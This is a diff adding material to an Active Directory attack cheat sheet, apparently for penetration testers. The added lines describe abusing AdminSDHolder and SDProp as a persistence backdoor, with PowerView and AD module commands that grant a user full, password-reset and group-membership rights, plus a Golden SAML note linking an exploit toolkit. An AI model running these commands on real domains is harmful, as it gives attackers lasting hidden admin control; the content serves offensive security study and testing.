@@ -508,6 +508,19 @@ the value "20000" in lookupsid is to indicate how many RID will be tested
 
 ### AdminSDHolder and SDProp
 
+> [ ❓ ] : With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions\) to the AdminSDHolder object.
+In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
+
+> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :
+```powershell
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights All -Verbose
+```
+> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :
+```powershell
+Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=megacorp,DC=megacorp,DC=local' -Principal $user -Verbose
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights ResetPassword -Verbose
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights WriteMembers -Verbose
+```
 
 ## ACLs and ACEs Abusing
 
@@ -677,6 +690,11 @@ Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,U
 ### PowerZure
 
 ### Golden SAML
+
+*Requirements :*
+- Admin privileges of ADFS server
+
+a toolkit to exploit Golden SAML can be found [here](https://github.com/secureworks/whiskeysamlandfriends)
 
 
 
